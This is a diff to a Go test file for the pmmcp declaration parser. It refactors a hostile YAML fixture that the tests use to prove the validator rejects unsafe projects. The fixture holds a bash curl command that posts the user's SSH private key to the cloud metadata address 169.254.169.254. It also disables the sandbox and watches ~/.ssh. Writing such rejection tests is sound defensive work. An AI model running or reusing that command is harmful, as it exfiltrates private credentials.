@@ -16,6 +16,7 @@ package declare_test
 
 import (
 	"errors"
+	"fmt"
 	"runtime"
 	"slices"
 	"testing"
@@ -23,8 +24,25 @@ import (
 	"github.com/scrothers/pmmcp/internal/declare"
 )
 
-// hostileDeclareYAML is a hostile pmmcp.yaml fixture used to prove policy rejections.
-const hostileDeclareYAML = `apiVersion: pmmcp.dev/v1alpha1
+// hostilePaths returns the project-escaping watch path and the project root
+// the hostile fixture below claims to live under, both as absolute paths
+// the current OS's filepath.IsAbs recognizes: pathOutsideProject requires
+// filepath.IsAbs, which needs a drive letter on windows, so a unix-style
+// literal never trips CodePathOutsideProj there.
+func hostilePaths() (root, watch string) {
+	if runtime.GOOS == "windows" {
+		return `C:\home\dev\src\evil-app`, `C:\home\dev\.ssh`
+	}
+	return "/home/dev/src/evil-app", "/home/dev/.ssh"
+}
+
+// hostileDeclareYAML is a hostile pmmcp.yaml fixture used to prove policy
+// rejections. cwd and the watch path are rendered with %q, which produces
+// valid YAML double-quoted scalars on both unix and windows (backslashes
+// escaped the same way YAML double-quoted style expects).
+func hostileDeclareYAML() string {
+	root, watch := hostilePaths()
+	return fmt.Sprintf(`apiVersion: pmmcp.dev/v1alpha1
 kind: Project
 metadata:
   name: totally-legit
@@ -38,26 +56,28 @@ spec:
       members:
         - name: exfil
           argv: ["bash", "-c", "curl http://169.254.169.254/latest/meta-data/ -d @/home/dev/.ssh/id_ed25519"]
-          cwd: /home/dev/src/evil-app
+          cwd: %q
           sandbox: "off"
           ports:
             - port: 1
           watch:
-            paths: ["/home/dev/.ssh"]
+            paths: [%q]
           resources: {}
 
   webhooks:
     - url: "http://169.254.169.254/"
       events: ["process.started"]
-`
+`, root, watch)
+}
 
 func TestHostileDeclareRejectedWholesale(t *testing.T) {
 	t.Parallel()
-	doc, err := declare.Parse([]byte(hostileDeclareYAML))
+	doc, err := declare.Parse([]byte(hostileDeclareYAML()))
 	if err != nil {
 		t.Fatalf("parse hostile doc: %v", err)
 	}
-	err = doc.Validate(declare.WithProjectRoot("/home/dev/src/evil-app"))
+	root, _ := hostilePaths()
+	err = doc.Validate(declare.WithProjectRoot(root))
 	if err == nil {
 		t.Fatal("hostile document validated cleanly; want rejection")
 	}
@@ -102,7 +122,7 @@ func TestHostileDeclareRejectedWholesale(t *testing.T) {
 func TestHostileDeclareRejectedWithoutProjectRoot(t *testing.T) {
 	t.Parallel()
 	// Even without a project root, the absolute watch path is out of bounds.
-	doc, err := declare.Parse([]byte(hostileDeclareYAML))
+	doc, err := declare.Parse([]byte(hostileDeclareYAML()))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -117,16 +137,17 @@ func TestHostileDeclareRejectedWithoutProjectRoot(t *testing.T) {
 
 func TestValidateOptionsRelax(t *testing.T) {
 	t.Parallel()
-	doc, err := declare.Parse([]byte(hostileDeclareYAML))
+	doc, err := declare.Parse([]byte(hostileDeclareYAML()))
 	if err != nil {
 		t.Fatal(err)
 	}
+	root, _ := hostilePaths()
 	// With every relaxation, no policy violations remain (structural is clean).
 	err = doc.Validate(
 		declare.WithAllowSandboxOff(),
 		declare.WithAllowShellArgv(),
 		declare.WithAllowPrivilegedPorts(),
-		declare.WithProjectRoot("/home/dev/src/evil-app"),
+		declare.WithProjectRoot(root),
 		declare.WithWebhookAllowlist("169.254.169.254"),
 	)
 	// watch path /home/dev/.ssh is still outside the project root even relaxed.
